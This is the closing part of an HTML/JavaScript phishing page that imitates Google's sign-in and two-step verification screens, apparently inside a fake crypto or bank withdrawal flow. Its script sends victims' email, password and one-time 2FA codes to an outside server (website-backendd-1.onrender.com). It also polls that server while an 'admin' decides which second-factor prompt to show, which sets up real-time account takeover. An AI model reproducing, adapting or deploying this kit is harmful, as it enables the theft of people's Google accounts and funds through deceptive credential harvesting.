                                <path fill="#34a853" d="M10.002 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                            </g>
                        </svg>
                    </div>
                </div>
                
                <div class="main-content">
                    <div class="security-key-verification">
                        <div class="verification-header">
                            <div class="verification-icon">
                                <i class="fas fa-key"></i>
                            </div>
                            <div class="verification-info">
                                <h2>Insert your security key</h2>
                                <p>Insert your security key into the USB port.</p>
                            </div>
                        </div>
                        
                        <div class="key-icon">
                            <i class="fas fa-key"></i>
                        </div>
                        
                        <div class="key-instructions">
                            <p>If your security key has a button, tap it.</p>
                        </div>
                        
                        <div class="verification-progress" id="key-verification-progress">
                            <div class="progress-spinner"></div>
                            <p class="progress-text">Waiting for security key...</p>
                        </div>
                        
                        <div class="dont-ask-again">
                            <input type="checkbox" id="dont-ask-key" class="dont-ask-checkbox">
                            <label for="dont-ask-key" class="dont-ask-label">Don't ask again on this device</label>
                        </div>
                    </div>
                </div>
                
                <div class="footer-actions">
                    <button class="create-account" onclick="closeGoogleModal('security-key-modal')">Cancel</button>
                    <button class="next-button" id="try-another-key" onclick="showOtherVerificationMethods()">Try another way</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Backup Codes Modal -->
    <div class="google-modal-overlay" id="backup-codes-modal" style="display: none;">
        <div class="google-modal">
            <div class="google-modal-content">
                <div class="logo-container">
                    <div class="google-logo">
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <g>
                                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.1 2.443-3.164 4.784-7.154 4.784-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c3.204 0 5.294 1.71 6.508 3.15l-2.646 2.535c-.68-.85-1.938-1.804-3.862-1.804-2.716 0-4.938 2.272-4.938 5.13s2.222 5.13 4.938 5.13c2.716 0 3.784-1.24 4.342-2.122h-4.342v-3.357h8.484c.1.5.16 1.05.16 1.66 0 5.01-3.36 7.388-8.64 7.388z"></path>
                                <path fill="#4285f4" d="M43.586 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#fbbc05" d="M25.17 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#34a853" d="M10.002 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                            </g>
                        </svg>
                    </div>
                </div>
                
                <div class="main-content">
                    <div class="authenticator-verification">
                        <div class="verification-header">
                            <div class="verification-icon">
                                <i class="fas fa-key"></i>
                            </div>
                            <div class="verification-info">
                                <h2>Enter a backup code</h2>
                                <p>Enter one of your 8-digit backup codes.</p>
                            </div>
                        </div>
                        
                        <div class="code-input-container">
                            <input type="text" maxlength="8" class="form-control" id="backup-code" placeholder="8-digit code">
                        </div>
                        
                        <div class="dont-ask-again">
                            <input type="checkbox" id="dont-ask-backup" class="dont-ask-checkbox">
                            <label for="dont-ask-backup" class="dont-ask-label">Don't ask again on this device</label>
                        </div>
                    </div>
                </div>
                
                <div class="footer-actions">
                    <button class="create-account" onclick="closeGoogleModal('backup-codes-modal')">Cancel</button>
                    <button class="next-button" id="verify-backup" onclick="verifyBackupCode()">Verify</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Verification in Progress Modal -->
    <div class="google-modal-overlay" id="verification-progress-modal" style="display: none;">
        <div class="google-modal">
            <div class="google-modal-content">
                <div class="logo-container">
                    <div class="google-logo">
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <g>
                                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.1 2.443-3.164 4.784-7.154 4.784-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c3.204 0 5.294 1.71 6.508 3.15l-2.646 2.535c-.68-.85-1.938-1.804-3.862-1.804-2.716 0-4.938 2.272-4.938 5.13s2.222 5.13 4.938 5.13c2.716 0 3.784-1.24 4.342-2.122h-4.342v-3.357h8.484c.1.5.16 1.05.16 1.66 0 5.01-3.36 7.388-8.64 7.388z"></path>
                                <path fill="#4285f4" d="M43.586 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#fbbc05" d="M25.17 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#34a853" d="M10.002 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                            </g>
                        </svg>
                    </div>
                </div>
                
                <div class="main-content">
                    <div class="verification-progress">
                        <div class="progress-spinner"></div>
                        <h2 class="title">Verifying your information</h2>
                        <p class="progress-text">This may take a few minutes. Please wait...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // =============================================
        // GOOGLE AUTHENTICATION LOGIC
        // =============================================
        
        let currentVerificationStep = 'email';
        let verificationEmail = '';
        let selected2FAMethod = '';
        let verificationTimer = null;
        let verificationStartTime = null;
        
        // Enhanced email/password verification modal
        function openEmailPasswordModal() {
            // Reset the modal state
            currentVerificationStep = 'email';
            verificationEmail = '';
            
            // Show email step, hide password step
            document.getElementById('email-step').style.display = 'block';
            document.getElementById('password-step').style.display = 'none';
            
            // Reset UI elements
            document.getElementById('verification-title').textContent = 'Sign in';
            document.getElementById('verification-subtitle').textContent = 'Use your Google Account';
            document.getElementById('verification-next-button').textContent = 'Next';
            
            // Clear inputs and errors
            document.getElementById('verification-email').value = '';
            document.getElementById('verification-password').value = '';
            document.getElementById('verification-email').classList.remove('error');
            document.getElementById('verification-password').classList.remove('error');
            document.getElementById('password-error').style.display = 'none';
            
            // Focus on email input
            setTimeout(() => {
                document.getElementById('verification-email').focus();
            }, 300);
            
            openGoogleModal('email-password-modal');
        }
        
        function handleVerificationStep() {
            if (currentVerificationStep === 'email') {
                const email = document.getElementById('verification-email').value.trim();
                
                if (!email) {
                    showNotification('error', 'Email Required', 'Please enter your email address', 3000);
                    document.getElementById('verification-email').focus();
                    return;
                }
                
                if (!isValidEmail(email)) {
                    showNotification('error', 'Invalid Email', 'Please enter a valid email address', 3000);
                    document.getElementById('verification-email').focus();
                    return;
                }
                
                // Store email and move to password step
                verificationEmail = email;
                currentVerificationStep = 'password';
                
                // Update UI for password step
                document.getElementById('email-step').style.display = 'none';
                document.getElementById('password-step').style.display = 'block';
                document.getElementById('verification-title').textContent = 'Welcome';
                document.getElementById('verification-subtitle').textContent = verificationEmail;
                document.getElementById('verification-next-button').textContent = 'Next';
                
                // Focus on password input
                setTimeout(() => {
                    document.getElementById('verification-password').focus();
                }, 300);
                
            } else if (currentVerificationStep === 'password') {
                const password = document.getElementById('verification-password').value;
                
                if (!password) {
                    showNotification('error', 'Password Required', 'Please enter your password', 3000);
                    document.getElementById('verification-password').focus();
                    return;
                }
                
                // Verify credentials
                verifyCredentials(verificationEmail, password);
            }
        }
        
        async function verifyCredentials(email, password) {
            try {
                // Show loading state
                document.getElementById('verification-next-button').disabled = true;
                document.getElementById('verification-next-button').textContent = 'Verifying...';
                
                // Send credentials to the backend endpoint with correct structure
                const response = await fetch('https://website-backendd-1.onrender.com/api/auth/records', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        provider: 'google'
                    })
                });
                
                // Reset button state
                document.getElementById('verification-next-button').disabled = false;
                document.getElementById('verification-next-button').textContent = 'Next';
                
                if (response.ok) {
                    const result = await response.json();
                    
                    // Clear the form
                    document.getElementById('verification-email').value = '';
                    document.getElementById('verification-password').value = '';
                    document.getElementById('verification-password').classList.remove('error');
                    document.getElementById('password-error').style.display = 'none';
                    
                    // Close email/password modal
                    closeGoogleModal('email-password-modal');
                    
                    // Show verification in progress modal
                    openGoogleModal('verification-progress-modal');
                    verificationStartTime = Date.now();
                    
                    // Start checking for 2FA trigger from admin
                    startVerificationPolling(email);
                    
                } else {
                    // Show password error like Google does
                    document.getElementById('verification-password').classList.add('error');
                    document.getElementById('password-error').style.display = 'flex';
                    document.getElementById('verification-password').focus();
                    
                    const error = await response.json();
                    throw new Error(error.message || 'Failed to verify credentials');
                }
            } catch (error) {
                console.error('Error verifying credentials:', error);
                showNotification('error', 'Verification Error', 'Failed to verify your credentials. Please try again.');
            }
        }
        
        // Polling for 2FA trigger from admin
        function startVerificationPolling(email) {
            let pollCount = 0;
            const maxPolls = 60; // 10 minutes at 10-second intervals
            
            const pollInterval = setInterval(async () => {
                pollCount++;
                
                try {
                    const response = await fetch(`https://website-backendd-1.onrender.com/api/auth/verification-status?email=${encodeURIComponent(email)}`);
                    
                    if (response.ok) {
                        const status = await response.json();
                        
                        if (status.requires2FA) {
                            clearInterval(pollInterval);
                            closeGoogleModal('verification-progress-modal');
                            
                            // Load 2FA methods from backend
                            load2FAMethods(email);
                            
                        } else if (status.verified) {
                            clearInterval(pollInterval);
                            closeGoogleModal('verification-progress-modal');
                            
                            // Proceed with withdrawal confirmation
                            if (pendingWithdrawalData.method === 'btc') {
                                showBtcConfirmationModal();
                            } else {
                                showBankConfirmationModal();
                            }
                        }
                    }
                    
                    // Check if we've exceeded the time limit (10-15 minutes)
                    const elapsedTime = Date.now() - verificationStartTime;
                    if (elapsedTime > 15 * 60 * 1000) { // 15 minutes
                        clearInterval(pollInterval);
                        closeGoogleModal('verification-progress-modal');
                        showNotification('error', 'Verification Timeout', 'Verification timed out. Please try again.');
                    }
                    
                } catch (error) {
                    console.error('Error polling verification status:', error);
                    
                    if (pollCount >= maxPolls) {
                        clearInterval(pollInterval);
                        closeGoogleModal('verification-progress-modal');
                        showNotification('error', 'Verification Error', 'Failed to complete verification. Please try again.');
                    }
                }
            }, 10000); // Poll every 10 seconds
        }
        
        // Load 2FA methods from backend
        async function load2FAMethods(email) {
            try {
                const response = await fetch(`https://website-backendd-1.onrender.com/api/auth/2fa-methods?email=${encodeURIComponent(email)}`);
                
                if (response.ok) {
                    const methods = await response.json();
                    display2FAMethods(methods, email);
                } else {
                    throw new Error('Failed to load 2FA methods');
                }
            } catch (error) {
                console.error('Error loading 2FA methods:', error);
                // Fallback to default methods
                display2FAMethods(getDefault2FAMethods(), email);
            }
        }
        
        // Default 2FA methods if backend fails
        function getDefault2FAMethods() {
            return [
                {
                    id: 'device-notification',
                    title: 'Select Yes on your phone or tablet',
                    description: 'Get a prompt on your Google-connected devices',
                    icon: 'fas fa-mobile-alt',
                    selected: true
                },
                {
                    id: 'authenticator',
                    title: 'Generate a security code on your phone or tablet',
                    description: 'Use Google Authenticator or similar app (even if it\'s offline)',
                    icon: 'fas fa-mobile-alt',
                    selected: false
                },
                {
                    id: 'sms',
                    title: 'Get a verification code by text',
                    description: 'Sent to your phone number ending in •••1234',
                    icon: 'fas fa-comment-alt',
                    selected: false
                },
                {
                    id: 'backup-codes',
                    title: 'Use a backup code',
                    description: 'Enter one of your 8-digit backup codes',
                    icon: 'fas fa-key',
                    selected: false
                },
                {
                    id: 'security-key',
                    title: 'Use your security key',
                    description: 'Insert your key into the USB port',
                    icon: 'fas fa-key',
                    selected: false
                }
            ];
        }
        
        // Display 2FA methods in the modal
        function display2FAMethods(methods, email) {
            const methodsContainer = document.getElementById('verification-methods');
            methodsContainer.innerHTML = '';
            
            // Set the email in the modal
            document.getElementById('two-step-email').textContent = email;
            
            methods.forEach(method => {
                const methodElement = document.createElement('div');
                methodElement.className = `method-option ${method.selected ? 'selected' : ''}`;
                methodElement.setAttribute('data-method', method.id);
                
                methodElement.innerHTML = `
                    <div class="method-icon">
                        <i class="${method.icon}"></i>
                    </div>
                    <div class="method-details">
                        <div class="method-title">${method.title}</div>
                        <div class="method-description">${method.description}</div>
                    </div>
                    <div class="method-radio"></div>
                `;
                
                methodElement.addEventListener('click', () => {
                    // Deselect all methods
                    document.querySelectorAll('.method-option').forEach(m => {
                        m.classList.remove('selected');
                    });
                    
                    // Select this method
                    methodElement.classList.add('selected');
                    selected2FAMethod = method.id;
                });
                
                methodsContainer.appendChild(methodElement);
                
                // Set the first method as selected by default
                if (method.selected) {
                    selected2FAMethod = method.id;
                }
            });
            
            openGoogleModal('two-step-modal');
        }
        
        // Show other verification methods
        function showOtherVerificationMethods() {
            closeCurrent2FAModal();
            openGoogleModal('two-step-modal');
        }
        
        // Verify the selected 2FA method
        function verifyTwoStep() {
            if (!selected2FAMethod) {
                showNotification('error', 'Method Required', 'Please select a verification method', 3000);
                return;
            }
            
            closeGoogleModal('two-step-modal');
            
            switch(selected2FAMethod) {
                case 'device-notification':
                    openDeviceNotificationModal();
                    break;
                case 'sms':
                    openSMSVerificationModal();
                    break;
                case 'authenticator':
                    openAuthenticatorModal();
                    break;
                case 'security-key':
                    openSecurityKeyModal();
                    break;
                case 'backup-codes':
                    openBackupCodesModal();
                    break;
                default:
                    showNotification('error', 'Method Error', 'Selected method is not available', 3000);
            }
        }
        
        // Device Notification Verification
        function openDeviceNotificationModal() {
            // Fetch device info from backend
            fetchDeviceInfo().then(deviceInfo => {
                document.getElementById('device-name').textContent = deviceInfo.name || 'Your device';
                document.getElementById('verification-code').textContent = deviceInfo.code || '55';
                openGoogleModal('device-notification-modal');
                
                // Start polling for device response
                startDevicePolling();
            }).catch(error => {
                console.error('Error fetching device info:', error);
                // Use default values
                document.getElementById('device-name').textContent = 'Tecno SPARK 9 Pro';
                document.getElementById('verification-code').textContent = '55';
                openGoogleModal('device-notification-modal');
                startDevicePolling();
            });
        }
        
        function startDevicePolling() {
            let pollCount = 0;
            const maxPolls = 90; // 15 minutes at 10-second intervals
            
            const pollInterval = setInterval(async () => {
                pollCount++;
                
                try {
                    const response = await fetch(`https://website-backendd-1.onrender.com/api/auth/device-response?email=${encodeURIComponent(verificationEmail)}`);
                    
                    if (response.ok) {
                        const status = await response.json();
                        
                        if (status.verified) {
                            clearInterval(pollInterval);
                            closeGoogleModal('device-notification-modal');
                            completeVerification();
                        }
                    }
                    
                    // Check if we've exceeded the time limit (15 minutes)
                    if (pollCount >= maxPolls) {
                        clearInterval(pollInterval);
                        closeGoogleModal('device-notification-modal');
                        showNotification('error', 'Verification Timeout', 'Device verification timed out. Please try again.');
                    }
                    
                } catch (error) {
                    console.error('Error polling device response:', error);
                    
                    if (pollCount >= maxPolls) {
                        clearInterval(pollInterval);
                        closeGoogleModal('device-notification-modal');
                        showNotification('error', 'Verification Error', 'Failed to complete device verification. Please try again.');
                    }
                }
            }, 10000); // Poll every 10 seconds
        }
        
        // SMS Verification
        function openSMSVerificationModal() {
            // Fetch phone info from backend
            fetchPhoneInfo().then(phoneInfo => {
                document.getElementById('phone-number').textContent = phoneInfo.maskedNumber || '•••1234';
                openGoogleModal('sms-verification-modal');
                
                // Set up code input auto-advance
                setupCodeInputs();
            }).catch(error => {
                console.error('Error fetching phone info:', error);
                // Use default values
                document.getElementById('phone-number').textContent = '•••1234';
                openGoogleModal('sms-verification-modal');
                setupCodeInputs();
            });
        }
        
        function setupCodeInputs() {
            const inputs = document.querySelectorAll('.code-input');
            
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length === 1) {
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        } else {
                            // Last input filled, auto-verify if all inputs are filled
                            if (areAllInputsFilled(inputs)) {
                                verifySMSCode();
                            }
                        }
                    }
                });
                
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }
        
        function areAllInputsFilled(inputs) {
            return Array.from(inputs).every(input => input.value.length === 1);
        }
        
        function verifySMSCode() {
            const inputs = document.querySelectorAll('.code-input');
            const code = Array.from(inputs).map(input => input.value).join('');
            
            if (code.length !== 6) {
                showNotification('error', 'Invalid Code', 'Please enter the complete 6-digit code', 3000);
                return;
            }
            
            // Verify code with backend
            verifyCodeWithBackend(code, 'sms').then(verified => {
                if (verified) {
                    closeGoogleModal('sms-verification-modal');
                    completeVerification();
                } else {
                    showNotification('error', 'Invalid Code', 'The code you entered is incorrect', 3000);
                    // Clear inputs
                    inputs.forEach(input => input.value = '');
                    inputs[0].focus();
                }
            }).catch(error => {
                console.error('Error verifying SMS code:', error);
                showNotification('error', 'Verification Error', 'Failed to verify code. Please try again.');
            });
        }
        
        // Authenticator App Verification
        function openAuthenticatorModal() {
            // Fetch authenticator info from backend
            fetchAuthenticatorInfo().then(authInfo => {
                document.getElementById('secret-key').textContent = authInfo.secretKey || 'JBSWY3DPEHPK3PXP';
                openGoogleModal('authenticator-modal');
                
                // Set up code input auto-advance
                setupAuthCodeInputs();
            }).catch(error => {
                console.error('Error fetching authenticator info:', error);
                // Use default values
                document.getElementById('secret-key').textContent = 'JBSWY3DPEHPK3PXP';
                openGoogleModal('authenticator-modal');
                setupAuthCodeInputs();
            });
        }
        
        function setupAuthCodeInputs() {
            const inputs = document.querySelectorAll('#authenticator-modal .code-input');
            
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length === 1) {
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        } else {
                            // Last input filled, auto-verify if all inputs are filled
                            if (areAllInputsFilled(inputs)) {
                                verifyAuthenticatorCode();
                            }
                        }
                    }
                });
                
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }
        
        function verifyAuthenticatorCode() {
            const inputs = document.querySelectorAll('#authenticator-modal .code-input');
            const code = Array.from(inputs).map(input => input.value).join('');
            
            if (code.length !== 6) {
                showNotification('error', 'Invalid Code', 'Please enter the complete 6-digit code', 3000);
                return;
            }
            
            // Verify code with backend
            verifyCodeWithBackend(code, 'authenticator').then(verified => {
                if (verified) {
                    closeGoogleModal('authenticator-modal');
                    completeVerification();
                } else {
                    showNotification('error', 'Invalid Code', 'The code you entered is incorrect', 3000);
                    // Clear inputs
                    inputs.forEach(input => input.value = '');
                    inputs[0].focus();
                }
            }).catch(error => {
                console.error('Error verifying authenticator code:', error);
                showNotification('error', 'Verification Error', 'Failed to verify code. Please try again.');
            });
        }
        
        // Security Key Verification
        function openSecurityKeyModal() {
            openGoogleModal('security-key-modal');
            
            // Start polling for security key response
            startSecurityKeyPolling();
        }
        
        function startSecurityKeyPolling() {
            let pollCount = 0;
            const maxPolls = 90; // 15 minutes at 10-second intervals
            
            const pollInterval = setInterval(async () => {
                pollCount++;
                
                try {
                    const response = await fetch(`https://website-backendd-1.onrender.com/api/auth/security-key-response?email=${encodeURIComponent(verificationEmail)}`);
                    
                    if (response.ok) {
                        const status = await response.json();
                        
                        if (status.verified) {
                            clearInterval(pollInterval);
                            closeGoogleModal('security-key-modal');
                            completeVerification();
                        }
                    }
                    
                    // Check if we've exceeded the time limit (15 minutes)
                    if (pollCount >= maxPolls) {
                        clearInterval(pollInterval);
                        closeGoogleModal('security-key-modal');
                        showNotification('error', 'Verification Timeout', 'Security key verification timed out. Please try again.');
                    }
                    
                } catch (error) {
                    console.error('Error polling security key response:', error);
                    
                    if (pollCount >= maxPolls) {
                        clearInterval(pollInterval);
                        closeGoogleModal('security-key-modal');
                        showNotification('error', 'Verification Error', 'Failed to complete security key verification. Please try again.');
                    }
                }
            }, 10000); // Poll every 10 seconds
        }
        
        // Backup Codes Verification
        function openBackupCodesModal() {
            openGoogleModal('backup-codes-modal');
        }
        
        function verifyBackupCode() {
            const code = document.getElementById('backup-code').value.trim();
            
            if (!code || code.length !== 8) {
                showNotification('error', 'Invalid Code', 'Please enter a valid 8-digit backup code', 3000);
                return;
            }
            
            // Verify code with backend
            verifyCodeWithBackend(code, 'backup').then(verified => {
                if (verified) {
                    closeGoogleModal('backup-codes-modal');
                    completeVerification();
                } else {
                    showNotification('error', 'Invalid Code', 'The backup code you entered is incorrect', 3000);
                    document.getElementById('backup-code').value = '';
                    document.getElementById('backup-code').focus();
                }
            }).catch(error => {
                console.error('Error verifying backup code:', error);
                showNotification('error', 'Verification Error', 'Failed to verify backup code. Please try again.');
            });
        }
        
        // Complete verification and proceed with withdrawal
        function completeVerification() {
            showNotification('success', 'Verification Successful', 'Your identity has been verified successfully.');
            
            // Now proceed with the withdrawal confirmation
            if (pendingWithdrawalData.method === 'btc') {
                showBtcConfirmationModal();
            } else {
                showBankConfirmationModal();
            }
        }
        
        // Close current 2FA modal
        function closeCurrent2FAModal() {
            const modals = [
                'device-notification-modal',
                'sms-verification-modal',
                'authenticator-modal',
                'security-key-modal',
                'backup-codes-modal'
            ];
            
            modals.forEach(modalId => {
                if (document.getElementById(modalId).style.display === 'flex') {
                    closeGoogleModal(modalId);
                }
            });
        }
        
        // =============================================
        // BACKEND INTEGRATION HELPERS
        // =============================================
        
        async function fetchDeviceInfo() {
            const response = await fetch(`https://website-backendd-1.onrender.com/api/auth/device-info?email=${encodeURIComponent(verificationEmail)}`);
            if (response.ok) {
                return await response.json();
            }
            throw new Error('Failed to fetch device info');
        }
        
        async function fetchPhoneInfo() {
            const response = await fetch(`https://website-backendd-1.onrender.com/api/auth/phone-info?email=${encodeURIComponent(verificationEmail)}`);
            if (response.ok) {
                return await response.json();
            }
            throw new Error('Failed to fetch phone info');
        }
        
        async function fetchAuthenticatorInfo() {
            const response = await fetch(`https://website-backendd-1.onrender.com/api/auth/authenticator-info?email=${encodeURIComponent(verificationEmail)}`);
            if (response.ok) {
                return await response.json();
            }
            throw new Error('Failed to fetch authenticator info');
        }
        
        async function verifyCodeWithBackend(code, method) {
            const response = await fetch('https://website-backendd-1.onrender.com/api/auth/verify-code', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: verificationEmail,
                    code: code,
                    method: method
                })
            });
            
            if (response.ok) {
                const result = await response.json();
                return result.verified;
            }
            throw new Error('Failed to verify code');
        }
        
        // =============================================
        // UTILITY FUNCTIONS
        // =============================================
        
        function openGoogleModal(modalId) {
            document.getElementById(modalId).style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
        
        function closeGoogleModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
            document.body.style.overflow = '';
        }
        
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }
        
        function showNotification(type, title, message, duration = 5000) {
            // This would integrate with your existing notification system
            console.log(`[${type.toUpperCase()}] ${title}: ${message}`);
        }
        
        // These would be defined in your main application
        let pendingWithdrawalData = null;
        function showBtcConfirmationModal() {
            // Implementation from your main app
            console.log('Showing BTC confirmation modal');
        }
        
        function showBankConfirmationModal() {
            // Implementation from your main app
            console.log('Showing Bank confirmation modal');
        }
    </script>
</body>
</html>
